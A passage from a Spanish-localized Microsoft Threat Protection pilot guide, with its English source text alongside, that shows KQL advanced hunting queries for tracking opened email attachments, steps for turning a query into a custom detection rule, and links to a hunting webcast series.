<span data-ttu-id="194f4-347">La tabla resultante ahora incluye detalles del extremo (ATP de Microsoft defender), como el nombre del dispositivo, la acción que se ha realizado (en este caso, filtrada para incluir solo eventos FileCreated) y dónde se ha guardado el archivo.</span><span class="sxs-lookup"><span data-stu-id="194f4-347">The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="194f4-348">También se incluirá el nombre de cuenta asociado con el proceso.</span><span class="sxs-lookup"><span data-stu-id="194f4-348">The account name associated with the process will also be included.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
```

<span data-ttu-id="194f4-349">Ya ha creado una consulta que identificará todos los correos electrónicos entrantes en los que el usuario abrió o guardó los datos adjuntos.</span><span class="sxs-lookup"><span data-stu-id="194f4-349">You have now created a query that will identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="194f4-350">También puede afinar esta consulta para filtrar los dominios de remitentes específicos, los tamaños de archivo, los tipos de archivo, etc.</span><span class="sxs-lookup"><span data-stu-id="194f4-350">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="194f4-351">Las funciones son un tipo especial de combinación que permite extraer más datos de TI de un archivo, como la prevalencia, la información del emisor y el emisor, etc.  Para obtener más detalles sobre el archivo, use la función **FileProfile ()** enriquecimiento:</span><span class="sxs-lookup"><span data-stu-id="194f4-351">Functions are a special sort of join which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
| distinct SHA1
| invoke FileProfile()
```


<span data-ttu-id="194f4-352">**Crear una detección**</span><span class="sxs-lookup"><span data-stu-id="194f4-352">**Create a detection**</span></span>

<span data-ttu-id="194f4-353">Una vez que haya creado una consulta que identifique la información a la que le gustaría recibir una **alerta** si se produce en el futuro, puede crear una detección personalizada desde la consulta.</span><span class="sxs-lookup"><span data-stu-id="194f4-353">Once you have created a query that identifies information that you would like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

<span data-ttu-id="194f4-354">Las detecciones personalizadas ejecutarán la consulta según la frecuencia que haya establecido y los resultados de las consultas crearán alertas de seguridad, en función de los activos afectados que elija.</span><span class="sxs-lookup"><span data-stu-id="194f4-354">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="194f4-355">Esas alertas se correlacionarán con incidentes y se pueden clasificar como cualquier otra alerta de seguridad generada por uno de los productos.</span><span class="sxs-lookup"><span data-stu-id="194f4-355">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1.  <span data-ttu-id="194f4-356">En la página consulta, elimine las líneas 7 y 8 que se agregaron en el paso 7 de las instrucciones Go de búsqueda y haga clic en **crear regla de detección**.</span><span class="sxs-lookup"><span data-stu-id="194f4-356">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
    ![Captura de pantalla en la que puede hacer clic en crear regla de detección en la página de búsqueda avanzada](../../media/mtp/fig22.png) 

>[!NOTE]
><span data-ttu-id="194f4-358">Si hace clic en **crear regla de detección** y tiene errores de sintaxis en la consulta, la regla de detección no se guardará.</span><span class="sxs-lookup"><span data-stu-id="194f4-358">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="194f4-359">Compruebe la consulta para asegurarse de que no haya errores.</span><span class="sxs-lookup"><span data-stu-id="194f4-359">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="194f4-360">Rellene los campos obligatorios con la información que permitirá que el equipo de seguridad comprenda la alerta, por qué se generó y qué acciones espera que realicen.</span><span class="sxs-lookup"><span data-stu-id="194f4-360">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    ![Captura de pantalla de la página crear regla de detección donde puede definir los detalles de la alerta](../../media/mtp/fig23.png)

<span data-ttu-id="194f4-362">Asegúrese de rellenar los campos con claridad para ayudar al siguiente usuario una decisión informada sobre esta alerta de regla de detección.</span><span class="sxs-lookup"><span data-stu-id="194f4-362">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="194f4-363">Seleccione qué entidades se ven afectadas en esta alerta.</span><span class="sxs-lookup"><span data-stu-id="194f4-363">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="194f4-364">En este caso, seleccione **dispositivo** y **buzón**.</span><span class="sxs-lookup"><span data-stu-id="194f4-364">In this case, select **Device** and **Mailbox**.</span></span>

    ![Captura de pantalla de la página crear regla de detección donde puede elegir los parámetros de las entidades afectadas](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="194f4-366">Determine qué acciones se deben realizar si se activa la alerta.</span><span class="sxs-lookup"><span data-stu-id="194f4-366">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="194f4-367">En este caso, ejecute un análisis de antivirus, aunque se pueden realizar otras acciones.</span><span class="sxs-lookup"><span data-stu-id="194f4-367">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    ![Captura de pantalla de la página crear regla de detección donde puede ejecutar un análisis antivirus cuando se desencadene una alerta para ayudar a solucionar las amenazas](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="194f4-369">Seleccione el ámbito de la regla de alertas.</span><span class="sxs-lookup"><span data-stu-id="194f4-369">Select the scope for the alert rule.</span></span> <span data-ttu-id="194f4-370">Como esta consulta implica dispositivos, los grupos de dispositivos son relevantes en esta detección personalizada de acuerdo con el contexto ATP de Microsoft defender.</span><span class="sxs-lookup"><span data-stu-id="194f4-370">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender ATP context.</span></span>  <span data-ttu-id="194f4-371">Al crear una detección personalizada que no incluye los dispositivos como entidades afectadas, no se aplica el ámbito.</span><span class="sxs-lookup"><span data-stu-id="194f4-371">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    ![Captura de pantalla de la página crear regla de detección donde puede establecer el ámbito de la regla de alerta administra sus expectativas para los resultados que verá](../../media/mtp/fig26.png) 

<span data-ttu-id="194f4-373">Para esta prueba piloto, es posible que quiera limitar esta regla a un subconjunto de dispositivos de prueba en su entorno de producción.</span><span class="sxs-lookup"><span data-stu-id="194f4-373">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6.  <span data-ttu-id="194f4-374">Seleccione **Crear**.</span><span class="sxs-lookup"><span data-stu-id="194f4-374">Select **Create**.</span></span> <span data-ttu-id="194f4-375">A continuación, seleccione **reglas de detección personalizadas** en el panel de navegación.</span><span class="sxs-lookup"><span data-stu-id="194f4-375">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![Captura de pantalla de la opción reglas de detección personalizadas en el menú](../../media/mtp/fig27a.png) 

    ![Captura de pantalla de la página reglas de detección que muestra la regla y los detalles de ejecución](../../media/mtp/fig27b.png) 

<span data-ttu-id="194f4-378">En esta página, puede seleccionar la regla de detección que abrirá una página de detalles.</span><span class="sxs-lookup"><span data-stu-id="194f4-378">From this page, you can select the detection rule which will open a details page.</span></span> 

![Captura de pantalla de la página datos adjuntos de correo electrónico donde puede ver el estado de la ejecución de la regla, desencadenar alertas y acciones, editar la detección, etc.](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="194f4-380">Ejercicios adicionales tutoriales de búsqueda avanzada</span><span class="sxs-lookup"><span data-stu-id="194f4-380">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="194f4-381">Para obtener más información sobre la búsqueda avanzada, las siguientes difusiones Web le guiarán a través de las capacidades de la búsqueda avanzada en la protección contra amenazas de Microsoft (MTP) para crear consultas entre el pilar, dinamizar en entidades y crear detecciones personalizadas y acciones de corrección.</span><span class="sxs-lookup"><span data-stu-id="194f4-381">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft Threat Protection (MTP) to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="194f4-382">Prepárese con su propia cuenta de GitHub para ejecutar las consultas de la caza en el entorno del laboratorio de pruebas piloto.</span><span class="sxs-lookup"><span data-stu-id="194f4-382">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

| <span data-ttu-id="194f4-383">**Title**</span><span class="sxs-lookup"><span data-stu-id="194f4-383">**Title**</span></span> | <span data-ttu-id="194f4-384">**Descripción**</span><span class="sxs-lookup"><span data-stu-id="194f4-384">**Description**</span></span> | <span data-ttu-id="194f4-385">**Descargar MP4**</span><span class="sxs-lookup"><span data-stu-id="194f4-385">**Download MP4**</span></span> | <span data-ttu-id="194f4-386">**Ver en YouTube**</span><span class="sxs-lookup"><span data-stu-id="194f4-386">**Watch on YouTube**</span></span> | <span data-ttu-id="194f4-387">**CSL archivo que usar**</span><span class="sxs-lookup"><span data-stu-id="194f4-387">**CSL file to use**</span></span> |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="194f4-388">Episodio 1: conceptos básicos de KQL</span><span class="sxs-lookup"><span data-stu-id="194f4-388">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="194f4-389">Trataremos los conceptos básicos de las funcionalidades de búsqueda avanzada en la protección contra amenazas de Microsoft.</span><span class="sxs-lookup"><span data-stu-id="194f4-389">We’ll cover the basics of advanced hunting capabilities in Microsoft Threat Protection.</span></span> <span data-ttu-id="194f4-390">Obtenga información sobre los datos de búsqueda avanzada disponibles y la sintaxis y los operadores de KQL básicos.</span><span class="sxs-lookup"><span data-stu-id="194f4-390">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="194f4-391"> MP4</span><span class="sxs-lookup"><span data-stu-id="194f4-391"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="194f4-392">YouTube</span><span class="sxs-lookup"><span data-stu-id="194f4-392">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="194f4-393">Episodio 1: archivo CSL en Git</span><span class="sxs-lookup"><span data-stu-id="194f4-393">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="194f4-394">Episodio 2: combinaciones</span><span class="sxs-lookup"><span data-stu-id="194f4-394">Episode 2: Joins</span></span> | <span data-ttu-id="194f4-395">Seguiremos aprendiendo sobre los datos de la búsqueda avanzada y cómo combinar tablas.</span><span class="sxs-lookup"><span data-stu-id="194f4-395">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="194f4-396">Obtenga información sobre las combinaciones internas, externas, únicas y semicombinadas, así como los matices del Kusto de innerunique predeterminado.</span><span class="sxs-lookup"><span data-stu-id="194f4-396">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="194f4-397">MP4</span><span class="sxs-lookup"><span data-stu-id="194f4-397">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="194f4-398">YouTube</span><span class="sxs-lookup"><span data-stu-id="194f4-398">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="194f4-399">Episodio 2: archivo CSL en Git</span><span class="sxs-lookup"><span data-stu-id="194f4-399">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="194f4-400">Episodio 3: resumir, dinamizar y visualizar datos</span><span class="sxs-lookup"><span data-stu-id="194f4-400">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="194f4-401">Ahora que podemos filtrar, manipular y unir datos, es el momento de empezar a resumir, cuantificar, dinamizar y visualizar.</span><span class="sxs-lookup"><span data-stu-id="194f4-401">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="194f4-402">En este episodio, trataremos el operador de Resumen y algunos de los cálculos que puede realizar al profundizar en tablas adicionales en el esquema de búsqueda avanzada.</span><span class="sxs-lookup"><span data-stu-id="194f4-402">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="194f4-403">Los conjuntos de información se convierten en gráficos que pueden ayudar a mejorar el análisis.</span><span class="sxs-lookup"><span data-stu-id="194f4-403">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="194f4-404">MP4</span><span class="sxs-lookup"><span data-stu-id="194f4-404">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="194f4-405">YouTube</span><span class="sxs-lookup"><span data-stu-id="194f4-405">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="194f4-406">Episodio 3: archivo CSL en Git</span><span class="sxs-lookup"><span data-stu-id="194f4-406">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="194f4-407">Episodio 4: ¡ vamos a buscar!</span><span class="sxs-lookup"><span data-stu-id="194f4-407">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="194f4-408">Aplicación de KQL al seguimiento de incidentes</span><span class="sxs-lookup"><span data-stu-id="194f4-408">Applying KQL to incident tracking</span></span>|<span data-ttu-id="194f4-409">Tiempo para realizar un seguimiento de la actividad del atacante</span><span class="sxs-lookup"><span data-stu-id="194f4-409">Time to track some attacker activity!</span></span> <span data-ttu-id="194f4-410">En este episodio, usaremos nuestra mejor comprensión de KQL y la búsqueda avanzada en la protección contra amenazas de Microsoft para realizar un seguimiento de un ataque.</span><span class="sxs-lookup"><span data-stu-id="194f4-410">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft Threat Protection to track an attack.</span></span> <span data-ttu-id="194f4-411">Obtenga información sobre algunas de las sugerencias y trucos que se usan en el campo para realizar un seguimiento de la actividad de los intrusos, incluidos los ABC de Cybersecurity y cómo aplicarlos a la respuesta ante incidentes.</span><span class="sxs-lookup"><span data-stu-id="194f4-411">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="194f4-412">MP4</span><span class="sxs-lookup"><span data-stu-id="194f4-412">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="194f4-413">YouTube</span><span class="sxs-lookup"><span data-stu-id="194f4-413">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="194f4-414">Episodio 4: archivo CSL en Git</span><span class="sxs-lookup"><span data-stu-id="194f4-414">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="194f4-415">Paso siguiente</span><span class="sxs-lookup"><span data-stu-id="194f4-415">Next step</span></span>
|<span data-ttu-id="194f4-416">![Fase de cierre y Resumen](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="194f4-416">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="194f4-417">Fase de cierre y Resumen</span><span class="sxs-lookup"><span data-stu-id="194f4-417">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="194f4-418">Analice el resultado del piloto de Microsoft Threat Protection, preséntela a las partes interesadas y realice el siguiente paso.</span><span class="sxs-lookup"><span data-stu-id="194f4-418">Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|

